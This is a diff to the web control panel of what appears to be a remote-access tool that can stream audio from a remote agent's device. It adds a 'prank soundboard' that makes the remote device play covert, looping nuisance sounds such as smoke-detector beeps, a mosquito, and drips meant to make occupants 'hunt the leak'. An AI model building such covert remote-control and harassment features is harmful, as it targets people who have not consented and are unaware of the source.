@@ -299,6 +299,14 @@ html{touch-action:manipulation}
         </div>
         <div style="display:flex;gap:6px;align-items:center"><label style="font-size:11px;color:#888">Vol</label><input id="volSlider" type="range" min="0" max="100" value="80" style="width:100px"/><span id="volLabel" style="font-size:11px">80%</span></div>
       </div>
+      <div class="toolbar" style="justify-content:space-between">
+        <div style="display:flex;gap:6px;align-items:center"><span style="font-size:11px;color:#888">Pranks:</span>
+          <button class="btn btn-small" id="sbToggle" title="Show/hide the prank soundboard">🔊 Board</button>
+          <span id="sbStatus" style="font-size:11px;color:#888">Board hidden</span>
+        </div>
+        <button class="btn btn-small" id="sbStopAll" title="Stop every prank sound">⏹ Stop all</button>
+      </div>
+      <div id="sbPanel" style="display:none;grid-template-columns:1fr 1fr;gap:6px;padding:6px;background:var(--bg-input);border:1px solid var(--border);border-radius:8px"></div>
     </section>
 
     <!-- Files -->
@@ -1557,6 +1565,57 @@ $("showTokenBtn").onclick=()=>{
 
 $("audioStart").onclick=()=>{ if(!selected){ toast("No agent", "err"); return; } const here=browserPlayHere(); sendCmdVal("get-audio-devices"); sendCmdVal(audioStreamCmd()); if(here){ browserAudioStart(); addConsole("Audio streaming ("+audioSrc+") — playing HERE in this browser (~300ms delay)"); } else addConsole("Audio streaming requested ("+audioSrc+") — plays on your ["+localOutName()+"] (~250ms delay)"); $("audioStart").disabled=true; $("audioStop").disabled=false; };
 $("audioStop").onclick=()=>{ if(selected) sendCmdVal("stop-audio-stream"); stopLocalPlayback(); addConsole("Audio stream stopped"); $("audioStart").disabled=false; $("audioStop").disabled=true; };
+// Prank soundboard (Screen tab): small frame, one row per slot. Sounds
+// land agent-side later; the contract is fixed now: play-prank <id>,
+// play-prank <id> loop, stop-prank <id>, stop-prank all. Rows render from
+// SB_SOUNDS (no per-row static IDs); one delegated listener serves all.
+const SB_SOUNDS=[
+  {id:"smoke", emoji:"🚨", name:"Smoke detector", desc:"One short beep every 30–60s. Still the best."},
+  {id:"mosquito", emoji:"🦟", name:"Mosquito", desc:"Quiet buzz, drifts left↔right."},
+  {id:"vibrate", emoji:"📳", name:"Pocket buzz", desc:"Phone vibrating on wood. Everyone checks pockets."},
+  {id:"droplet", emoji:"💧", name:"Water droplet", desc:"One drop every few minutes. They'll hunt the leak."},
+  {id:"fly", emoji:"🪰", name:"Fly-by", desc:"Short buzz past the ear, gone before they find it."},
+  {id:"hum", emoji:"🔌", name:"Mains hum", desc:"Barely audible. Flickers on/off — blame the charger."},
+];
+const sbState={}; // id -> {playing, loop}
+function sbRender(){
+  const p=$("sbPanel"); if(!p) return;
+  p.innerHTML=SB_SOUNDS.map(s=>{
+    const st=sbState[s.id]||{playing:false,loop:false};
+    return `<div style="display:flex;gap:6px;align-items:center;padding:6px;background:rgba(255,255,255,.02);border:1px solid var(--border);border-radius:6px">`
+      +`<span style="font-size:16px">${s.emoji}</span>`
+      +`<div style="flex:1;min-width:0"><div style="font-size:11px;color:var(--fg-bright)">${s.name}</div>`
+      +`<div style="font-size:10px;color:#888;white-space:nowrap;overflow:hidden;text-overflow:ellipsis" title="${s.desc}">${s.desc}</div></div>`
+      +`<span data-sbstat="${s.id}" style="font-size:10px;color:${st.playing?"#7EE787":"#666"}">${st.playing?(st.loop?"🔁":"▶"):"·"}</span>`
+      +`<button class="btn btn-small" data-sbact="play" data-sbid="${s.id}" title="Play ${s.name}">▶</button>`
+      +`<button class="btn btn-small" data-sbact="loop" data-sbid="${s.id}" title="Loop ${s.name}" style="${st.loop?"border-color:#7EE787;color:#7EE787":""}">🔁</button>`
+      +`<button class="btn btn-small" data-sbact="stop" data-sbid="${s.id}" title="Stop ${s.name}">■</button>`
+      +`</div>`;
+  }).join("");
+}
+function sbSay(txt){ const el=$("sbStatus"); if(el) el.textContent=txt; }
+function sbSend(cmd){ if(!needAgent()) return false; sendCmdVal(cmd); return true; }
+$("sbToggle")?.addEventListener("click", ()=>{
+  const p=$("sbPanel"); if(!p) return;
+  const open=p.style.display==="none";
+  p.style.display=open?"grid":"none";
+  if(open){ sbRender(); sbSay("Pick a prank — sounds arrive with the agent update"); }
+  else sbSay("Board hidden");
+});
+$("sbStopAll")?.addEventListener("click", ()=>{
+  if(!sbSend("stop-prank all")) return;
+  Object.keys(sbState).forEach(k=>{ sbState[k]={playing:false,loop:false}; });
+  sbRender(); sbSay("Stop sent for all slots"); addConsole("Soundboard: stop all");
+});
+$("sbPanel")?.addEventListener("click", e=>{
+  const b=e.target.closest("[data-sbact]"); if(!b) return;
+  const id=b.dataset.sbid, act=b.dataset.sbact;
+  const st=sbState[id]||(sbState[id]={playing:false,loop:false});
+  if(act==="play"){ if(!sbSend("play-prank "+id+(st.loop?" loop":""))) return; st.playing=true; sbSay("▶ "+id+(st.loop?" (loop)":"")); }
+  else if(act==="loop"){ st.loop=!st.loop; if(st.loop){ if(!sbSend("play-prank "+id+" loop")){ st.loop=false; return; } st.playing=true; sbSay("🔁 "+id+" looping"); } else { sbSend("stop-prank "+id); st.playing=false; sbSay("🔁 "+id+" loop off"); } }
+  else if(act==="stop"){ if(!sbSend("stop-prank "+id)) return; st.playing=false; sbSay("■ "+id+" stopped"); }
+  sbRender();
+});
 $("muteBtn").onclick=()=>{ if(!selected) return; sendCmdVal("set-mic-mute on"); addConsole("Mute toggled"); };
 $("volSlider").oninput=e=>{ $("volLabel").textContent=e.target.value+"%"; };
 $("volSlider").onchange=e=>{ if(selected) sendCmdVal("set-volume "+e.target.value); };
